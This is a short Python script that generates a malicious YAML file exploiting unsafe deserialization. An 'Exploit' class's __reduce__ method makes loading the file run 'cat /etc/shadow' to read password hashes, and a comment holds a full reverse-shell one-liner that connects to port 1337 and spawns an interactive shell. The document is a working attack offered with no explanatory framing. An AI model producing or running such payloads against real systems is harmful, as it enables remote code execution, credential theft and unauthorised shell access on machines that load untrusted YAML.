import yaml
import subprocess

class Exploit():
	def __reduce__(self):
		return (subprocess.Popen, (('cat', '/etc/shadow'),))
	
# "import socket,subprocess,os;s=socket.socket();s.connect(('localhost',1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"
		
f = open('exploit.yaml', 'w')
yaml.dump(Exploit(), f)
f.close()
